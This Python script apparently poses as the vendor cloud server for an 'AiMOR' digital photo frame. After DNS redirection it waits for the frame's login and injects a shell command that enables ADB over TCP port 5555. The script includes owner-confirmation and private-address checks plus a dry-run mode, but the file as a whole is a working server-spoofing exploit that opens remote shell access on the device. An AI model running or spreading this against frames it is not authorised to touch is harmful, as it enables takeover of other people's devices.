#!/usr/bin/env python3
"""Single-frame AiMOR stand-in. Requires frame-only DNS redirection separately.

Accepts only --frame-ip, waits for its vendor login and sends one runtime ADB
command. Does not disable authentication, install keys, or write firmware.
Inbound login payloads are neither decoded nor logged.
"""
import argparse
import ipaddress
import json
import socket
import time
from proto import FrameReader, frame, edu_pipeline, CMD_PIP_HEAD, RECEIVE_SHELL_COMMAND

ADB_COMMAND = 'setprop service.adb.tcp.port 5555; stop adbd; start adbd'


def event(kind, **values):
    print(json.dumps({'event': kind, **values}), flush=True)


class Session:
    def __init__(self, expected_ip, notify=event):
        self.expected_ip = expected_ip
        self.sent = False
        self.notify = notify

    def handle(self, conn, peer, deadline):
        if peer != self.expected_ip:
            self.notify('rejected_peer', peer=peer)
            return
        reader = FrameReader()
        conn.settimeout(1)
        while time.monotonic() < deadline:
            try:
                data = conn.recv(4096)
            except socket.timeout:
                continue
            if not data:
                return
            for seq, cmd, payload in reader.feed(data):
                self.notify('received_frame', command=cmd, payload_bytes=len(payload))
                if cmd == 110009 and payload and not self.sent:
                    # Pipeline command goes in protobuf field 4, never the fixed header.
                    packet = frame(1, CMD_PIP_HEAD, edu_pipeline(RECEIVE_SHELL_COMMAND, ADB_COMMAND.encode()))
                    conn.sendall(packet)
                    self.sent = True
                    self.notify('runtime_adb_command_sent', peer=peer,
                                note='Transmission only; verify separately with adb connect.')
                elif cmd == 101 and not payload:
                    conn.sendall(frame(seq, 101, b''))


def private_ipv4(value):
    address = ipaddress.IPv4Address(value)
    if not address.is_private or address.is_unspecified or address.is_multicast:
        raise argparse.ArgumentTypeError('Use a specific private IPv4 address')
    return str(address)


def main():
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument('--frame-ip', type=private_ipv4)
    parser.add_argument('--bind', type=private_ipv4, default='127.0.0.1')
    parser.add_argument('--port', type=int, default=7806)
    parser.add_argument('--seconds', type=int, default=300)
    parser.add_argument('--dry-run', action='store_true')
    args = parser.parse_args()
    if args.dry_run:
        packet = frame(1, CMD_PIP_HEAD, edu_pipeline(RECEIVE_SHELL_COMMAND, ADB_COMMAND.encode()))
        event('dry_run', command=ADB_COMMAND, header_command=CMD_PIP_HEAD,
              protobuf_command=RECEIVE_SHELL_COMMAND, packet_bytes=len(packet), network_contact=False)
        return
    if not args.frame_ip:
        parser.error('--frame-ip must be the current owner-confirmed frame address')
    if not 1 <= args.port <= 65535 or not 1 <= args.seconds <= 600:
        parser.error('Port or duration outside bounds')
    session = Session(args.frame_ip)
    deadline = time.monotonic() + args.seconds
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as listener:
        listener.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        listener.bind((args.bind, args.port))
        listener.listen(4)
        listener.settimeout(1)
        event('listening', bind=args.bind, port=args.port, expected_frame=args.frame_ip,
              duration_seconds=args.seconds, dns_changed=False)
        while time.monotonic() < deadline:
            try:
                conn, addr = listener.accept()
            except socket.timeout:
                continue
            with conn:
                try:
                    session.handle(conn, addr[0], min(deadline, time.monotonic() + 40))
                except (ValueError, OSError) as error:
                    event('session_closed', reason=type(error).__name__)
            if session.sent:
                break
    event('stopped', command_sent=session.sent, adb_verified=False)


if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        event('stopped_by_owner')
